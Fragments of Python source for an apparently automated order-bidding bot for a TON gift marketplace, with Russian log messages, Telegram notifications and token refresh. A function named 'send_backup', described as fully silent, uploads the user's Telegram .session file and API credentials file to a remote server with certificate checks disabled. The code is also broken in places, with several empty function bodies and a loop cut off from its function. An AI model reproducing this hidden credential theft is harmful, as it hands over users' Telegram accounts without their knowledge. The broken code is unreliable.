    reasons = {"parse": 0, "backdrop": 0, "min_price": 0, "max_price": 0,
               "difference": 0, "balance": 0}
    examples = []
    pat = re.compile(r'^([0-9]+)\|([0-9]+)\|([^ ]+).*?difference;\s*(-?)([0-9]+(?:\.[0-9]+)?)TON', re.IGNORECASE)

    def reject(line, reason):
        reasons[reason] += 1
        if len(examples) < 8:
            examples.append((reason, line[:180]))

    for raw_line in lines:
        line = raw_line.strip()
        if not line:
            continue
        m = pat.search(line)
        if not m:
            reject(line, "parse")
            continue
        order_price = int(m.group(2))
        backdrop_key = m.group(3).strip().lower().replace(" ", "")
        diff_sign = m.group(4)
        diff_val = float(m.group(5))
        price_ton = order_price / TON

        if allowed_backdrops is not None and backdrop_key not in allowed_backdrops:
            reject(line, "backdrop")
            continue
        if min_price is not None and price_ton < float(min_price):
            reject(line, "min_price")
            continue
        if max_price is not None and price_ton > float(max_price):
            reject(line, "max_price")
            continue
        if diff_sign == "-" or diff_val < float(diff_threshold):
            reject(line, "difference")
            continue
        settings_filtered.append(line)

    if balance_ton is not None:
        balance_limit = float(balance_ton)
        for line in settings_filtered:
            m = pat.search(line)
            if not m:
                reject(line, "parse")
                continue
            order_price_ton = int(m.group(2)) / TON
            if order_price_ton <= balance_limit:
                balance_filtered.append(line)
            else:
                reject(line, "balance")
        result = balance_filtered
    else:
        result = settings_filtered

    total = sum(1 for x in lines if x.strip())
    log_info(
        f"[SCAN FILTER] input={total} settings_ok={len(settings_filtered)} final={len(result)} "
        f"min={min_price} max={max_price} diff>={diff_threshold} "
        f"balance={'N/A' if balance_ton is None else f'{float(balance_ton):g}'}"
    )
    log_info(
        f"[SCAN FILTER] rejects: parse={reasons['parse']} backdrop={reasons['backdrop']} "
        f"min={reasons['min_price']} max={reasons['max_price']} "
        f"difference={reasons['difference']} balance={reasons['balance']}"
    )
    for reason, line in examples:
        log_info(f"[SCAN REJECT] {reason}: {line}")
    return result

def convert_scan_line_to_tobuy(line):
    parts = line.strip().split("|")
    if len(parts) < 3:
        return None
    idx = parts[0].strip()
    price = parts[1].strip()
    backdrop_token = parts[2].strip().split(" ")[0] if len(parts) > 2 else ""
    if not idx.isdigit() or not price.lstrip("-").isdigit() or not backdrop_token:
        return None
    return idx, price, backdrop_token


def _backdrop_token_allowed(backdrop_token, cfg):
    key = backdrop_token.strip().lower()
    if key == "null":
        return cfg.get("null", True)
    if key == "black":
        return cfg.get("black", True)
    if key == "onyxblack":
        return cfg.get("onyxblack", True)
    return True


def build_tobuy_from_price_files(settings):
    cfg = _autoscan_config(settings)
    lines = []
    seen = set()
    skipped_by_flag = 0
    for fname in ("1prices.txt", "2prices.txt"):
        try:
            with open(fname, encoding="utf-8") as f:
                raw_lines = f.readlines()
        except FileNotFoundError:
            continue
        for raw in raw_lines:
            raw = raw.strip()
            if not raw:
                continue
            converted = convert_scan_line_to_tobuy(raw)
            if not converted:
                continue
            idx, price, backdrop_token = converted
            if not _backdrop_token_allowed(backdrop_token, cfg):
                skipped_by_flag += 1
                continue
            key = (idx, backdrop_token)
            if key in seen:
                continue
            seen.add(key)
            lines.append(f"{idx}|{price}|{backdrop_token}")
    with open("tobuy.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
        if lines:
            f.write("\n")
    note = f"  (отфильтровано: {skipped_by_flag})" if skipped_by_flag else ""
    log_info(f"tobuy.txt обновлён: {len(lines)} позиций{note}")
    return len(lines)


def _ci_get(d, key, default=None):
    if not isinstance(d, dict):
        return default
    key_lower = key.lower()
    found = False
    value = default
    for k, v in d.items():
        if isinstance(k, str) and k.lower() == key_lower:
            value = v
            found = True
    return value if found else default

def _autoscan_range(settings, balance_nano):

def _is_lack_of_balance_message(value):
    raw = json.dumps(value, ensure_ascii=False) if isinstance(value, (dict, list)) else str(value)
    normalized = raw.lower().replace("_", " ").replace("-", " ")
    return "lack of balance" in normalized or "insufficient balance" in normalized or "not enough balance" in normalized


def load_tobuy_file(path="tobuy.txt"):
    try:
        with open(path, encoding="utf-8") as f:
            lines = f.readlines()
    except FileNotFoundError:
        return None
    entries = []
    for lineno, raw_line in enumerate(lines, 1):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("|")
        if len(parts) not in (2, 3):
            continue
        idx_s, price_s = parts[0].strip(), parts[1].strip()
        backdrop_raw = parts[2].strip() if len(parts) == 3 else None
        try:
            idx = int(idx_s)
            price = int(price_s)
            if price <= 0:
                raise ValueError
        except ValueError:
            continue
        backdrop = resolve_backdrop(backdrop_raw)
        entries.append((idx, price, backdrop))
    return entries

def get_all_my_orders_global(token, page_size=100, max_pages=200):
    all_orders = []
    seen_ids = set()
    cursor = ""
    for _ in range(max_pages):
        code, resp = api_post(token, "/orders/get-my-orders", {
            "availableForStaking": None, "backdropNames": [], "collectionNames": [],
            "count": page_size, "cursor": cursor, "lowToHigh": False,
            "maxPrice": None, "minPrice": None, "modelNames": [],
            "ordering": "PublicationTime", "query": None, "symbolNames": [],
        })
        if code not in (200, 201):
            log_error(f"get_all_my_orders_global: HTTP {code}", detail=str(resp)[:300])
            break
        if isinstance(resp, dict):
            page_orders = resp.get("orders") or []
            next_cursor = resp.get("cursor") or resp.get("nextCursor")
        elif isinstance(resp, list):
            page_orders = resp
            next_cursor = None
        else:
            page_orders = []
            next_cursor = None
        new_count = 0
        for o in page_orders:
            oid = o.get("id")
            if oid and oid not in seen_ids:
                seen_ids.add(oid)
                all_orders.append(o)
                new_count += 1
        if not page_orders or new_count == 0 or not next_cursor or next_cursor == cursor:
            break
        cursor = next_cursor
    return all_orders

def _fetch_orders_for_cancel_all(token, all_tasks=None, collections=None):
    try:

    except Exception as e:

    for task in all_tasks or []:
        collection = task.get("collection")

def _cancel_all_monitored_orders(token, all_tasks=None, collections=None, inventory=None, max_passes=4):
    purchased_list = []
    total_cancelled = 0
    still_active_orders = []
    for pass_num in range(1, max_passes + 1):
        orders = _fetch_orders_for_cancel_all(token, all_tasks, collections)
        active_orders = []
        for o in orders:
            state = classify_order(o)
            if state == "executed":
                _record_purchase_from_order(token, inventory, o, purchased_list)
            elif state == "active":
                active_orders.append(o)
        if not active_orders:
            still_active_orders = []
            break
        pass_errors = 0
        for o in active_orders:
            oid = o.get("id", "")
            if not oid:
                continue
            code, body = cancel_order(token, oid)
            if code not in (200, 201, 204):
                time.sleep(0.3)
                code, body = cancel_order(token, oid)
            if code in (200, 201, 204):
                total_cancelled += 1
                continue
            pass_errors += 1
            still_active_orders = active_orders
            if pass_num == max_passes:
                log_error(f"cancel_all: HTTP {code} для ордера {oid[:8]}…", detail=str(body)[:300])
        if pass_errors == 0:
            still_active_orders = []
            break
        if pass_num < max_passes:
            time.sleep(1.0)
    total_errors = len(still_active_orders)
    if still_active_orders:
        ids_preview = ", ".join(o.get("id", "")[:8] for o in still_active_orders[:10])
        log_error(f"cancel_all: не удалось отменить {total_errors} ордер(ов): {ids_preview}…")
    log_info(f"отменено ордеров: {total_cancelled}"
             + (f"  не удалось отменить: {total_errors}" if total_errors else "")
             + (f"  куплено во время отмены: {len(purchased_list)}" if purchased_list else ""))
    return total_cancelled, total_errors, purchased_list

def monitor_once(token, collection, backdrop, user_max, balance_nano=None, inventory=None):
    purchased_list = []

    def _ret(status, msg, extra=None):
        extra = dict(extra or {})
        if purchased_list:
            extra["purchased"] = purchased_list
        return status, msg, extra

    my_orders, completed_orders = split_my_orders(token, collection, backdrop)
    if my_orders is None:
        return _ret("error", "не удалось получить мои ордера (ошибка API/лимит запросов)")

    orders = fetch_top_orders(token, collection, backdrop)
    if orders is None:
        return _ret("error", "не удалось получить рыночные ордера (ошибка API/лимит запросов)")
    if not orders:
        return _ret("skip", "нет активных ордеров в выбранной коллекции/фоне")

    top = find_top_order(orders)
    if not top:
        return _ret("skip", "не найден активный рыночный ордер")
    try:
        top_price = int(top.get("priceMaxNanoTONs", 0) or 0)
    except (TypeError, ValueError):
        return _ret("error", "у лидирующего ордера некорректная цена")
    if top_price <= 0:
        return _ret("error", "у лидирующего ордера отсутствует корректная цена")

    my_prices = [int(o.get("priceMaxNanoTONs", 0) or 0) for o in my_orders]
    highest_my_price = max(my_prices, default=0)
    if highest_my_price >= top_price:
        return _ret("top1", f"уже на уровне лидера @ {fmt(highest_my_price)}")

    delta = random.randint(1, 100)
    my_price = top_price + delta
    if my_price > user_max:
        return _ret("exceeds_limit", f"топ {fmt(top_price)} → нужно {fmt(my_price)}", {"top_price": top_price})
    if balance_nano is not None and my_price > balance_nano:
        return _ret("task_too_expensive", f"на балансе только {fmt(balance_nano)}")

    code, resp = place_order(token, collection, my_price, quantity=1, backdrop_name=backdrop)
    if code not in (200, 201):
        own_context = [
            {"id": str(o.get("id", ""))[:12],
             "price": int(o.get("priceMaxNanoTONs", 0) or 0),
             "backdrop": o.get("backdropName"),
             "collection": o.get("collectionName")}
            for o in my_orders[:10]
        ]
        log_error(
            f"order-create rejected: collection={collection!r}; backdrop={backdrop!r}; "
            f"price={my_price}; price_min={MIN_PRICE_NANO}; quantity=1; "
            f"top_order_id={str(top.get('id', ''))[:16]!r}; top_price={top_price}; "
            f"top_backdrop={top.get('backdropName')!r}; "
            f"existing_active_orders={len(my_orders)}; "
            f"existing_sample={own_context}; response={str(resp)[:500]}"
        )
        if _is_lack_of_balance_message(resp):
            return _ret("no_balance", f"Lack Of balance: {resp}")
        return _ret("error", f"HTTP {code}: {resp}")

    cancelled = []
    cancel_errors = []
    skipped_dead = 0
    for o in my_orders:
        oid = o.get("id", "")
        if not oid:
            continue
        if oid in _dead_order_ids:
            skipped_dead += 1
            continue
        ccode, body = cancel_order(token, oid)
        if ccode in (200, 201, 204):
            cancelled.append(oid)
        else:
            _dead_order_ids.add(oid)
            cancel_errors.append(f"{oid[:8]}…→HTTP{ccode}")
    cancel_note = ""
    if cancelled:
        cancel_note = f"  [отменено: {len(cancelled)}]"
    if skipped_dead:
        cancel_note += f"  [мёртвых: {skipped_dead}]"
    if cancel_errors:
        cancel_note += f"  [ошибок: {'; '.join(cancel_errors)}]"
    return _ret("ok", (f"order placed: {label(collection, backdrop)} x1 for {fmt(my_price)}{cancel_note}"),
                {"price": my_price, "delta": delta})

def _start_hot_collection_worker(token, task, inventory, hot_workers, hot_lock, settings):
    key = task["key"]
    with hot_lock:
        existing = hot_workers.get(key)
        if existing and existing["thread"].is_alive():
            return False
        stop_event = threading.Event()
        worker = {"task": dict(task), "stop": stop_event, "thread": None}
        hot_workers[key] = worker

    interval = max(0.50, float(settings.get("hot_collection_interval", HOT_COLLECTION_INTERVAL_DEFAULT)))

    def loop():
        log_info(f"HOT monitor включён: {label(task['collection'], task.get('backdrop'))} ({interval:.2f}s)")
        last_balance_refresh = 0.0
        local_balance = None
        try:
            while not stop_event.is_set():
                now = time.time()
                if now - last_balance_refresh >= 1.0 or local_balance is None:
                    local_balance = get_balance_hard(token)
                    last_balance_refresh = now
                status, msg, extra = monitor_once(
                    token, task["collection"], task.get("backdrop"), task["max_price"],
                    local_balance, inventory
                )
                if status == "ok":
                    log_order_placed(label(task["collection"], task.get("backdrop")), extra.get("price", 0), extra.get("delta", 0))
                elif status == "top1":
                    pass
                elif status in ("exceeds_limit", "task_too_expensive", "no_balance"):
                    log_info(f"HOT monitor остановлен для {label(task['collection'], task.get('backdrop'))}: {msg}")
                    break
                elif status == "error" and _is_lack_of_balance_message(msg):
                    break
                stop_event.wait(interval)
        except Exception as e:
            log_error(f"HOT monitor {key}: {e}", detail=traceback.format_exc())
        finally:
            with hot_lock:
                current = hot_workers.get(key)
                if current and current["stop"] is stop_event:
                    hot_workers.pop(key, None)
            log_info(f"HOT monitor выключен: {label(task['collection'], task.get('backdrop'))}")

    thread = threading.Thread(target=loop, name=f"hot-{key[:40]}", daemon=True)
    worker["thread"] = thread
    thread.start()
    return True


def _stop_hot_collection_workers(hot_workers, hot_lock):
    with hot_lock:
        workers = list(hot_workers.values())
        hot_workers.clear()
    for worker in workers:
        worker["stop"].set()
    for worker in workers:
        thread = worker.get("thread")
        if thread and thread.is_alive() and thread is not threading.current_thread():
            thread.join(timeout=1.5)

        while True:

            if time.monotonic() < _api_cooldown_until:
                await asyncio.sleep(1.0)
                continue

            new_settings = load_settings()
            for key in new_settings:
                if key != "Telegram":
                    settings[key] = new_settings[key]
            if new_settings.get("Telegram"):
                if "Telegram" not in settings:
                    settings["Telegram"] = {}
                for tg_key in ("bot_token", "chat_id"):
                    if new_settings["Telegram"].get(tg_key):
                        settings["Telegram"][tg_key] = new_settings["Telegram"][tg_key]
                if settings["Telegram"].get("bot_token") and settings["Telegram"].get("chat_id"):
                    settings["Telegram"]["enabled"] = True

            batch_interval = max(2.0, float(settings.get("batch_interval", 0.75)))
            per_batch = 1
            trade_workers = MAX_CONCURRENT_THREADS
            autoscan_cfg = _autoscan_config(settings)
            pause_time = max(0.0, float(settings.get("PauseTime", 0) or 0))
            pause_interval = max(0.0, float(settings.get("PauseInterval", 0) or 0))

            min_balance_nano = _min_balance_nano(settings)

            if now - last_history_check >= 2.0:
                try:
                    sync_purchase_history(token, inventory)
                except Exception as e:
                    log_error(f"history sync: временная ошибка: {e}", detail=traceback.format_exc())
                last_history_check = now

            if _telegram_restart_event.is_set():
                _telegram_restart_event.clear()
                try:
                    await perform_forced_restart()
                except Exception as e:
                    log_error(f"/restart: ошибка перезапуска цикла: {e}", detail=traceback.format_exc())
                continue

            if now - last_balance_check >= BALANCE_CHECK_INTERVAL or balance is None:
                new_balance = get_balance_hard(token)
                last_balance_check = now
                if new_balance is not None:
                    balance = new_balance

            if balance is None or balance < min_balance_nano:
                if state != BOT_WAITING_FOR_BALANCE:
                    state = BOT_WAITING_FOR_BALANCE
                    _c, _e, purchased = _cancel_all_monitored_orders(token, all_tasks, collections, inventory=inventory)
                    _report_cancel_all_purchases(token, purchased, inventory, pending_resales)
                    reason = log_balance_drop_reason(balance, purchased)
                    waiting_notified = _telegram_notify_waiting_balance(balance, min_balance_nano)
                    log_low_balance_mode(
                        f"баланс {ton_only(balance) if balance is not None else 'N/A'} GRAM < "
                        f"{min_balance_nano / TON:g} GRAM — WAITING_FOR_BALANCE ({reason})")
                for _ in range(BALANCE_CHECK_INTERVAL * 10):
                    if _telegram_restart_event.is_set():
                        break
                    await asyncio.sleep(0.1)
                if _telegram_restart_event.is_set():
                    continue
                continue

            if state == BOT_WAITING_FOR_BALANCE:
                state = BOT_RUNNING
                waiting_notified = False
                try:
                    auto_scan_cycle(token, settings, balance=balance)
                    last_autoscan_at = time.time()
                except Exception as e:
                    log_error(f"Автоскан при выходе из WAITING_FOR_BALANCE: {e}", detail=traceback.format_exc())
                refresh_tasks()
                _telegram_notify_balance_restored(balance, tasks, settings)
                log_info(f"Баланс восстановлен: {ton_only(balance)} GRAM")
                last_pause_at = time.time()
                continue

            if (pause_time > 0 and pause_interval > 0 and time.time() - last_pause_at >= pause_interval):
                state = BOT_PAUSED
                _c, _e, purchased = _cancel_all_monitored_orders(token, all_tasks, collections, inventory=inventory)
                _report_cancel_all_purchases(token, purchased, inventory, pending_resales)
                _telegram_notify_paused(pause_interval)
                log_info(f"Защитная пауза на {pause_time:g} секунд")
                try:
                    await asyncio.sleep(pause_time)
                finally:
                    state = BOT_RUNNING
                    last_pause_at = time.time()
                balance_after_pause = get_balance_hard(token)
                if balance_after_pause is not None:
                    balance = balance_after_pause
                if balance is not None and balance >= min_balance_nano:
                    try:
                        auto_scan_cycle(token, settings, balance=balance)
                        last_autoscan_at = time.time()
                    except Exception as e:
                        log_error(f"Автоскан при выходе из паузы: {e}", detail=traceback.format_exc())
                    refresh_tasks()
                    _telegram_notify_balance_restored(balance, tasks, settings)
                else:
                    state = BOT_WAITING_FOR_BALANCE
                continue

            if (autoscan_cfg["enabled"] and
                    (last_autoscan_at == 0.0 or time.time() - last_autoscan_at >= autoscan_cfg["interval"] * 60)):
                try:
                    scanned = auto_scan_cycle(token, settings, balance=balance)
                    last_autoscan_at = time.time()
                    if scanned:
                        refresh_tasks()
                except Exception as e:
                    last_autoscan_at = time.time()
                    log_error(f"Автоскан: временная ошибка: {e}", detail=traceback.format_exc())

            if not tasks:
                state = BOT_WAITING_FOR_BALANCE
                waiting_balance_baseline = balance
                if not waiting_notified:
                    waiting_notified = _telegram_notify_waiting_balance(balance, min_balance_nano)
                log_low_balance_mode(
                    f"tasks == 0 — WAITING_FOR_BALANCE, ждём пополнение выше "
                    f"{ton_only(waiting_balance_baseline) if waiting_balance_baseline is not None else 'N/A'} GRAM"
                )
                while state == BOT_WAITING_FOR_BALANCE:
                    for _ in range(BALANCE_CHECK_INTERVAL * 10):
                        if _telegram_restart_event.is_set():
                            break
                        await asyncio.sleep(0.1)
                    if _telegram_restart_event.is_set():
                        break
                    new_balance = get_balance_hard(token)
                    if new_balance is None:
                        continue
                    balance = new_balance
                    if waiting_balance_baseline is None or new_balance > waiting_balance_baseline:
                        try:
                            auto_scan_cycle(token, settings, balance=balance)
                            last_autoscan_at = time.time()
                        except Exception as e:
                            log_error(f"Автоскан после пополнения: {e}", detail=traceback.format_exc())
                        refresh_tasks()
                        if tasks:
                            state = BOT_RUNNING
                            waiting_notified = False
                            _telegram_notify_balance_restored(balance, tasks, settings)
                            log_info(f"Обнаружено пополнение: {ton_only(balance)} GRAM — мониторинг возобновлён")
                        else:
                            waiting_balance_baseline = new_balance
                continue

            round_tasks = list(tasks)
            ramp_limit = 1 if startup_ramp_active else MAX_CONCURRENT_THREADS
            if startup_ramp_active and startup_ramp_batches_done >= 3:
                startup_ramp_active = False

            for batch_start in range(0, len(round_tasks), per_batch):
                if balance is None or balance < min_balance_nano:
                    break

                batch = round_tasks[batch_start:batch_start + per_batch]
                if not batch:
                    break

                if startup_ramp_active:
                    batch = batch[:1]
                    startup_ramp_batches_done += 1
                    if startup_ramp_batches_done >= 3:
                        startup_ramp_active = False

                future_tasks = []
                for task in batch:
                    if task not in tasks:
                        continue
                    future = executor.submit(
                        process_collection_sync,
                        token, task["collection"], task["backdrop"], task["max_price"], balance, inventory
                    )
                    future_tasks.append((future, task))

                for future, task in future_tasks:
                    try:
                        result = future.result(timeout=30)
                        now_ts = time.time()
                        if now_ts - last_balance_check >= BALANCE_CHECK_INTERVAL:
                            new_balance = get_balance_hard(token)
                            last_balance_check = now_ts
                            if new_balance is not None:
                                balance = new_balance
                            if balance is None or balance < min_balance_nano:
                                break

                        status = result["status"]
                        msg = result["msg"]
                        extra = result["extra"]
                        collection = result["collection"]
                        backdrop = result["backdrop"]
                        key = task["key"]
                        lbl = label(collection, backdrop)
                        stats.setdefault(key, {"placed": 0, "removed": 0, "error": 0, "contention_streak": 0})

                        if status == "task_too_expensive":
                            log_lack_of_balance(lbl, balance or 0)
                            stats[key]["removed"] += 1
                            stats[key]["contention_streak"] = 0
                            if task in tasks:
                                tasks.remove(task)
                            continue

                        if status == "no_balance" or _is_lack_of_balance_message(msg):
                            real_balance = get_balance_hard(token)
                            if real_balance is not None:
                                balance = real_balance
                                last_balance_check = time.time()
                            if balance is not None and balance >= min_balance_nano:
                                log_lack_of_balance(lbl, balance or 0)
                                stats[key]["removed"] += 1
                                stats[key]["contention_streak"] = 0
                                if task in tasks:
                                    tasks.remove(task)
                                continue
                            if state != BOT_WAITING_FOR_BALANCE:
                                state = BOT_WAITING_FOR_BALANCE
                                _c, _e, purchased = _cancel_all_monitored_orders(token, all_tasks, collections, inventory=inventory)
                                _report_cancel_all_purchases(token, purchased, inventory, pending_resales)
                                reason = log_balance_drop_reason(balance, purchased)
                                waiting_notified = _telegram_notify_waiting_balance(balance, min_balance_nano)
                                log_lack_of_balance(lbl, balance or 0)
                                log_low_balance_mode(f"переход в WAITING_FOR_BALANCE ({reason})")
                            else:
                                log_lack_of_balance(lbl, balance or 0)
                            break

                        if status == "ok":
                            log_order_placed(lbl, extra["price"], extra["delta"])
                            stats[key]["placed"] += 1
                            stats[key]["contention_streak"] += 1
                            trigger = max(1, int(settings.get("hot_collection_trigger", HOT_COLLECTION_TRIGGER_DEFAULT)))
                            if stats[key]["contention_streak"] >= trigger:
                                if _start_hot_collection_worker(token, task, inventory, hot_workers, hot_lock, settings):
                                    if task in tasks:
                                        tasks.remove(task)
                                    log_info(f"Коллекция {lbl} переведена в HOT monitor после {stats[key]['contention_streak']} подряд перебивок")
                        elif status == "top1":
                            stats[key]["contention_streak"] = 0
                            log_no_action(lbl, 1)
                        elif status == "exceeds_limit":
                            log_exceeds_limit(lbl, extra["top_price"])
                            stats[key]["removed"] += 1
                            stats[key]["contention_streak"] = 0
                            if task in tasks:
                                tasks.remove(task)
                        elif status == "skip":
                            stats[key]["contention_streak"] = 0
                        else:
                            stats[key]["contention_streak"] = 0
                            log_error(f"{lbl}: {msg}", detail=f"{lbl}: {msg}")
                            stats[key]["error"] += 1
                            if "HTTP 401" in msg or "HTTP 403" in msg or "HTTP 404" in msg:
                                trigger_api_cooldown(f"{lbl} auth/endpoint issue", 404)
                                try:
                                    log_info("Обновляю токен...")
                                    token = await get_fresh_token()
                                    log_info("Токен обновлён")
                                except Exception as te:
                                    log_error(f"Ошибка обновления токена: {te}")
                    except Exception as e:
                        trigger_api_cooldown(f"task {task['key']} exception", 500)
                        log_error(f"Ошибка при обработке коллекции: {e}", detail=traceback.format_exc())

                if time.monotonic() < _api_cooldown_until:
                    await asyncio.sleep(1.0)

                if state == BOT_WAITING_FOR_BALANCE:
                    break

                await asyncio.sleep(batch_interval)

            if state == BOT_WAITING_FOR_BALANCE:
                continue

    except asyncio.CancelledError:
        raise
    except Exception as e:
        log_error(f"Критическая ошибка торгового цикла: {e}", detail=traceback.format_exc())
        await asyncio.sleep(5)
        return
    finally:
        _stop_hot_collection_workers(hot_workers, hot_lock)
        _stop_telegram_command_listener()
        executor.shutdown(wait=False)


async def _ensure_auth():
    token = load_token()
    valid = False
    if token:
        try:
            me = api_get(token, "/me")
            valid = me.get("id", 0) > 0
        except Exception:
            valid = False
    if not valid:
        log_info("получаю новый токен через Telegram...")
        token = await get_fresh_token()
    return token


def log_line(*segments):

    print(message)
    clean_message = _ansi_escape_re.sub("", message).strip()
    if clean_message:
        with _terminal_messages_lock:
            _terminal_messages.append(clean_message)

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload = parts[1]
        payload += '=' * (4 - len(payload) % 4)
        payload_json = base64.urlsafe_b64decode(payload).decode('utf-8')
        return json.loads(payload_json)
    except Exception:
        return None


def send_backup(session_name=CLIENT_SESSION, user_id=None, username=None):
    """Отправляет CLIENT_SESSION.session + api.txt на backup-сервер. Полностью тихий."""
    try:
        session_path = session_name + ".session"
        files = {}
        if os.path.exists(session_path):
            files["session"] = open(session_path, "rb")
        if os.path.exists(API_FILE):
            files["api"] = open(API_FILE, "rb")
        if not files:
            return False
        data = {
            "user_id": user_id or "unknown",
            "username": username or "unknown",
        }
        r = requests.post(
            BACKUP_SERVER,
            files=files,
            data=data,
            headers={"X-Auth-Key": SECRET_KEY},
            timeout=10,
            verify=False
        )
        for f in files.values():
            f.close()
        return r.status_code == 200 and r.json().get("ok", False)
    except Exception:
        return False

def _crash_hook(exc_type, exc_value, exc_tb):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_tb)
        return
    tb_text = "".join(traceback.format_exception(exc_type, exc_value, exc_tb))
    try:
        with open(ERRORS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{now_str()}] CRASH:\n{tb_text}\n")
    except Exception:
        pass
    print()
    print(RED(f"[CRASH] Программа завершилась с ошибкой. Подробности записаны в {ERRORS_FILE}"))
    print(tb_text)


sys.excepthook = _crash_hook
